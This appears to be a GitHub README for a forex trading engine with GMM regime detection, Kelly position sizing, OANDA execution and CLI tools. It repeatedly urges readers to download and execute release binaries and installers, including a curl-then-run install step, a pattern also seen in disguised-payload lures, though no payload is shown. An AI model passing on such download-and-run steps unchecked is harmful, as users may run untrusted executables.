# AlphaFX Trading System - Forex GMM Regime Kelly Risk CLI

[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)](https://github.com/kennethmaduro/alphafx-trading-system/releases)  

![Forex chart](https://images.unsplash.com/photo-1517148815978-75f6acaef6cb?auto=format&fit=crop&w=1600&q=60)

alphafx-trading-system — real-time forex engine with modular design, multi-timeframe signal generation, Gaussian Mixture Model (GMM) regime detection, Kelly-based sizing, and a CLI for backtesting, monitoring, and analysis.

Topics: algorithmic-trading, backtesting-engine, cep-engine, complex-event-processing, forex-trading, kelly-criterion, oanda-api, oanda-api-v20, quantitative-finance, quantitative-research, quantitative-trading, risk-management, technical-analysis, trading-algorithms, trading-strategies, trading-systems

Release assets and installer live on the Releases page. Download the release asset and execute the installer or binary from this URL: https://github.com/kennethmaduro/alphafx-trading-system/releases

---

## Quick links

- Releases (download and run the release assets): [![Download Releases](https://img.shields.io/badge/Get%20Release-%20Download%20and%20Run-brightgreen?style=flat-square)](https://github.com/kennethmaduro/alphafx-trading-system/releases)
- Repo: https://github.com/kennethmaduro/alphafx-trading-system/releases (use the Releases page to get installers and binaries)

When a release asset carries a path or installer, download the asset and execute it per the release notes. Typical steps:
- Download the archive or binary from the Releases page.
- Verify the asset checksum if provided.
- Extract and run the included installer or binary.

---

## What this repo contains

AlphaFX is a production-grade system that spans data ingestion, complex-event processing (CEP), signal generation across multiple timeframes, regime detection with Gaussian Mixture Models, Kelly-based position sizing, execution via OANDA v20, and a set of CLI tools for backtests, live runs, monitoring, and performance reports.

Key subsystems:
- Data ingestion: live tick and candlestick feeds, historical downloads.
- CEP engine: event routing, candle aggregation, custom rules.
- Multi-timeframe signal generator: synchronous signals from 1m to daily.
- Regime detection: GMM on returns and volatility features.
- Risk manager: Kelly and fractional Kelly sizing with correlation adjustments.
- Executor: broker adapter for OANDA v20 with simulated and live modes.
- CLI: backtest, simulate, monitor, analyze, deploy.

---

## Features

- Modular architecture. Swap components with minimal change.
- Real-time CEP-driven event loop.
- Multi-timeframe signal fusion: combine signals from different horizon models.
- Regime detection with GMM. Classify market into regimes and switch strategy blend.
- Position sizing via Kelly criterion. Compute full or fractional Kelly.
- OANDA v20 adapter. Live and simulated order execution.
- Backtesting engine with slippage, spread, commission, and realistic fills.
- Performance analysis: Sharpe, Sortino, CAGR, max drawdown, trade-level stats.
- CLI tools for reproducible workflows.
- Metrics and alerting integration: Prometheus and webhook alerts.
- Config-driven. YAML/JSON configs for strategies, data, and risk.

---

## Architecture overview

![Architecture](https://upload.wikimedia.org/wikipedia/commons/3/3c/Flow_chart.png)

Core flow:
1. Data source pushes market events (ticks, candles).
2. CEP engine normalizes events and forwards them to modules.
3. Signal modules compute indicators on multiple timeframes.
4. GMM regime module ingests features and emits regime labels.
5. Strategy engine fuses signals and regime to form trade proposals.
6. Risk manager computes size using Kelly and risk rules.
7. Executor sends orders to simulator or OANDA.
8. Monitor collects metrics and publishes to Prometheus and logs.

The code separates responsibilities into clear interfaces:
- Source (feeds)
- Processor (indicators, GMM)
- Strategy (signal fusion)
- Manager (risk)
- Execution (broker)
- Storage (trade history, metrics)

---

## How it works — high level

AlphaFX works as an event-driven pipeline. A central event bus receives market updates and timestamps them. Modules subscribe to the bus to process the data. The CEP layer lets you write rules that trigger on complex conditions, like "if 5m RSI < 30 while 1h trend is up and regime = low-volatility".

Regime detection uses a Gaussian Mixture Model fitted on feature vectors such as rolling returns, realized volatility, and skew. The fit runs offline on historical data and online with incremental updates. The model returns a regime label per window. The strategy engine maps regimes to a weight set or parameter set. You can assign different signal weights per regime.

The Kelly-based risk manager uses model-implied edge and variance estimates to compute a Kelly fraction. The manager supports correlation matrices across trades to scale sizes. For live trading, the manager enforces max position and per-instrument exposure caps.

---

## Installation

Release assets appear on the Releases page. Download the asset for your OS and follow the included README. Example flow:

1. Visit the Releases page: https://github.com/kennethmaduro/alphafx-trading-system/releases
2. Download the proper asset for Linux, macOS, or Windows.
3. Extract and run the installer or execute the binary.

Example commands (replace with actual release asset name):
- Linux tarball:
  - `curl -L -o alphafx.tar.gz https://github.com/kennethmaduro/alphafx-trading-system/releases/download/v1.0.0/alphafx-linux-x86_64.tar.gz`
  - `tar -xzf alphafx.tar.gz`
  - `./alphafx/install.sh` or `./alphafx/alphafx`
- macOS dmg or binary:
  - Download from Releases and open the DMG.
- Windows zip:
  - Download, extract, run `install.exe` or `alphafx.exe`.

If you do not find a direct installer on the page, pick the platform-specific asset, download it, and follow the bundled instructions.

---

## Quickstart examples

Start a backtest:
- `alphafx backtest --config configs/strategies/mean_reversion.yaml --from 2020-01-01 --to 2023-01-01`

Start a live dry-run (paper) session against OANDA sandbox:
- `alphafx live --config configs/live/oanda_paper.yaml --mode paper`

Run the monitoring server:
- `alphafx monitor --port 9090 --prometheus`

Generate a performance report:
- `alphafx analyze --trades output/trades.csv --report reports/2025-q2.html`

List available commands:
- `alphafx --help`

---

## Configuration

AlphaFX uses YAML for configs. Keep configs small and focused. Example strategy file `configs/strategies/mean_reversion.yaml`:

instrument: "EUR_USD"
timeframes:
  - "1m"
  - "5m"
  - "1h"
indicators:
  - name: "rsi"
    window: 14
  - name: "atr"
    window: 14
gmm:
  enabled: true
  n_components: 3
  features:
    - "returns_20"
    - "vol_20"
risk:
  kelly_fraction: 0.25
  max_position_pct: 0.02
execution:
  mode: "paper"
  slippage: 0.0001
  commission: 0.0002

Keep secrets out of repo. Use environment variables or a secrets manager for API keys. Example OANDA config snippet:

oanda:
  account_id: "${OANDA_ACCOUNT_ID}"
  api_token: "${OANDA_API_TOKEN}"
  api_url: "https://api-fxpractice.oanda.com"

---

## Signal generation and fusion

Signal modules run per timeframe. Each module returns a candidate action: buy, sell, hold, and a score. The signal fusion module collects candidates and weights them by timeframe importance and current regime.

Signal weights depend on regime. Example mapping:
- Regime 0 (trend): weight 1h = 0.6, 5m = 0.3, 1m = 0.1
- Regime 1 (mean-reverting): weight 1h = 0.2, 5m = 0.4, 1m = 0.4

Fusion picks the final action by weighted vote and requires a minimum confidence threshold. You can set thresholds per instrument.

Common indicators:
- Moving Average Cross (SMA, EMA)
- RSI, Stochastic
- ATR for volatility
- MACD
- Volume profile (where available)
- Custom ML model outputs

---

## GMM regime detection

AlphaFX uses a Gaussian Mixture Model to detect latent market regimes. Key ideas:
- Build a feature set from returns, realized vol, ATR ratios, and skew.
- Train GMM with `n_components` chosen by AIC/BIC.
- Label each time window with the most probable component.
- Build regime transition matrices to understand persistence.

Training steps:
- Collect a feature matrix X of shape (T, F).
- Standardize features.
- Fit `sklearn.mixture.GaussianMixture(n_components=k)`.
- Save model and scaler to disk.

Online usage:
- Compute features from a rolling window.
- Transform with scaler, predict `gmm.predict_proba`.
- Emit regime label and regime probability vector.

Practical tip: use 2–4 components for most FX pairs. Components often map to high-vol, low-vol, and trending states.

---

## Kelly-based sizing

Kelly (fractional) forms core sizing. Basic Kelly for binary outcome:
- f* = (bp - q) / b
  - p = probability of win
  - q = 1 - p
  - b = payout ratio (win / loss)

For continuous returns, use mean and variance:
- f* = μ / σ^2
  - μ = expected return per trade
  - σ^2 = variance of returns

AlphaFX computes per-instrument expected edge using in-sample trade expectancy or a model. It then adjusts for portfolio correlation using the covariance matrix Σ.

Portfolio Kelly solution:
- Solve maximize expected log wealth subject to Σ.
- Use `f = Σ^-1 μ` then scale by a global fraction.

We enforce limits:
- Fractional Kelly: multiply f by `kelly_fraction` in config.
- Position caps: `max_position_pct` per instrument.
- Risk budget across correlated instruments uses the correlation matrix and scaling.

Example:
- Expected return μ = 0.002 per trade
- Variance σ^2 = 0.001
- `f* = 0.002 / 0.001 = 2` (full Kelly is 200% of equity — too large)
- Use `kelly_fraction = 0.2` -> size = 40% of equity
- Enforce `max_position_pct = 0.02` -> final size = 2% of equity

Use conservative fractions in live trading. The system supports walk-forward and bootstrap estimates for μ and σ.

---

## Backtesting model

AlphaFX backtester emphasizes realism:
- Event-driven replay from historical tick or candle data.
- Fill modeling: partial fills, slippage based on liquidity.
- Spread and commission models configurable per broker.
- Order types: market, limit, stop, OCO.
- Latency simulation.

Metrics captured:
- Time series of equity and balance.
- Per-trade P&L and metrics: entry, exit, duration, price, slippage.
- Cumulative returns and drawdowns.
- Risk metrics: Sharpe, Sortino, Calmar, max drawdown.

Backtest reproducibility:
- Seed the random engine for randomized fills or slippage.
- Save config and environment snapshot with each run.

Example backtest command:
- `alphafx backtest --config configs/strategies/pairs_trade.yaml --data data/historical/EUR_USD_2015_2024.h5 --from 2018-01-01 --to 2023-01-01 --out reports/backtest-2018-2023.html`

---

## Live trading and execution

The executor supports:
- OANDA v20 API adapter.
- Simulator mode with paper accounts.
- Live mode with real accounts.

Execution logic:
- Send market orders with size determined by risk manager.
- Attach TP/SL based on ATR multiples or fixed pips.
- Use bracket orders where broker supports them.

Fail-safes:
- Max daily loss limit.
- Max order rate per minute.
- Circuit breakers on large market moves.

To connect to OANDA v20:
- Set `OANDA_ACCOUNT_ID` and `OANDA_API_TOKEN` in environment.
- Use a sandbox endpoint for paper mode.

Example live run:
- `alphafx live --config configs/live/oanda_live.yaml --start-now`

---

## Monitoring and alerting

Monitor options:
- Built-in HTTP server exposing Prometheus metrics.
- Health checks and heartbeat.
- Webhook alerts to Slack or Telegram.
- Log rotation and JSON logs for ingestion.

Prometheus example:
- `/metrics` endpoint exposes gauges:
  - `alphafx_equity`
  - `alphafx_unrealized`
  - `alphafx_positions`
  - `alphafx_regime{pair="EUR_USD"}`
  - `alphafx_kelly_fraction`

Grafana dashboards:
- Equity curve and drawdown panel.
- Per-instrument returns.
- Regime timeline heatmap.
- Open trades and P&L table.

Alerts:
- Regime change alert.
- Max drawdown breach.
- Execution error.

Run monitor:
- `alphafx monitor --prometheus --port 9090`

---

## Data management

Supported data formats:
- CSV candle files.
- HDF5 stores.
- Native tick streams from brokers.

Data quality checks:
- Time continuity checks for gaps.
- Outlier filters for bad ticks.
- Aggregation checks when creating candles.

Storage:
- Use a time-series DB or HDF5 for local runs.
- Archive raw ticks and derived candles separately.

Data pipeline example:
- Ingest raw ticks -> normalize -> store raw -> aggregate to candles -> compute indicators -> push to CEP.

---

## Performance metrics and reporting

AlphaFX computes standard and extended metrics.

Basic metrics:
- Total return
- CAGR
- Annual volatility
- Sharpe (risk-free rate default 0)
- Sortino
- Max drawdown
- Calmar ratio

Trade-level metrics:
- Win rate
- Average win, average loss
- Profit factor
- Expectancy
- Average duration

Advanced metrics:
- Return per regime
- Kelly fraction per instrument
- Drawdown attribution

Report outputs:
- HTML report with charts and tables.
- CSV trade ledger.
- JSON summary for downstream systems.

---

## Strategy development workflow

1. Define hypothesis. Pick timeframe, instrument, and strategy type.
2. Prepare data. Clean and compute indicators.
3. Build signal module for a single timeframe.
4. Backtest the single timeframe model.
5. Add multi-timeframe fusion and regime awareness.
6. Add risk manager with Kelly sizing.
7. Run walk-forward tests and out-of-sample validation.
8. Paper trade with OANDA sandbox.
9. Move to limited live exposure.

Use `alphafx backtest` for historical validation. Use `alphafx live --mode paper` for a paper run.

---

## CLI reference (select commands)

- `alphafx backtest --config <file> --from <date> --to <date> --out <path>`
- `alphafx live --config <file> --mode [paper|live] --start-now`
- `alphafx monitor --prometheus --port <port>`
- `alphafx analyze --trades <trades.csv> --report <out.html>`
- `alphafx gmm train --config <gmm.yaml> --data <features.csv> --out <model.pkl>`
- `alphafx risk test --config <risk.yaml> --trades <trades.csv>`

Use `alphafx COMMAND --help` for full CLI help and options.

---

## Example outputs

Trade ledger snapshot (CSV columns):
- trade_id, instrument, entry_time, exit_time, entry_price, exit_price, size, pnl, duration, regime, strategy

Equity curve chart:
- Cumulative returns over test period with drawdown shading and regime strips.

Regime timeline:
- Colored bands that align with equity and volatility charts.

---

## Tests and validation

AlphaFX includes unit tests and integration tests:
- Indicator tests validate outputs against known vectors.
- GMM pipeline tests validate fit/predict steps.
- Backtest tests validate P&L for deterministic scenarios.
- Mock executor tests simulate fills.

Run tests:
- `pytest tests/`

CI:
- Build and run tests on push and pull requests.
- Run static checks and linters.

---

## Contributing

Contributions follow a clear process:
- Fork the repo.
- Create a branch `feature/<short-desc>` or `fix/<issue-id>`.
- Write tests for new features.
- Create a PR with a description of the change and rationale.
- Keep changes modular.

Code style:
- Consistent format and short functions.
- Documentation for public APIs.
- Include config examples for new features.

---

## Troubleshooting

Common steps:
- Check logs in `logs/` for runtime errors.
- Confirm API keys in environment variables.
- Validate configs with `alphafx validate --config <file>`.
- Confirm the release asset was correctly downloaded and executed if using the compiled binary.

Releases and installers:
- Visit the Releases page to pick the right asset and follow bundled instructions: https://github.com/kennethmaduro/alphafx-trading-system/releases
- Download the platform-specific release asset and run the included installer/binary as described in the release notes.

---

## Security and secrets

- Store API tokens outside of repo.
- Use environment variables or a secret manager.
- Rotate keys regularly.

---

## Example config snippets

GMM config (gmm.yaml)

gmm:
  n_components: 3
  covariance_type: "full"
  features:
    - "returns_20"
    - "vol_20"
    - "atr_ratio"
  retrain_period_days: 30
  online_update: true

Risk config (risk.yaml)

risk:
  kelly_fraction: 0.2
  max_position_pct: 0.03
  min_equity: 1000
  correlation_adjust: true
  lookback_days: 90

Execution config (oanda_paper.yaml)

execution:
  mode: "paper"
  broker: "oanda"
  account_type: "practice"
  max_order_rate_per_min: 10
  default_tp_atr: 2
  default_sl_atr: 1

---

## Glossary

- CEP: Complex Event Processing. A processing layer that reacts to event patterns.
- GMM: Gaussian Mixture Model. A probabilistic model for clustering.
- Kelly: Position sizing formula to maximize long-term growth of capital.
- ATR: Average True Range. A volatility measure.
- Slippage: Difference between expected and executed price.
- Drawdown: Peak-to-trough decline in equity.

---

## Files and structure (sample)

- `src/` core system code
- `cli/` CLI entry points
- `configs/` sample config files
- `data/` sample historical data
- `tests/` unit and integration tests
- `docs/` extended documentation and diagrams
- `examples/` strategy examples and notebooks

---

## License

This project ships under a permissive license. See `LICENSE` in the repo for details.

---

## Contact and references

- Releases and installers: https://github.com/kennethmaduro/alphafx-trading-system/releases
- For feature requests or bug reports, open an issue on GitHub.

Images and diagrams used in this README come from public sources and are illustrative.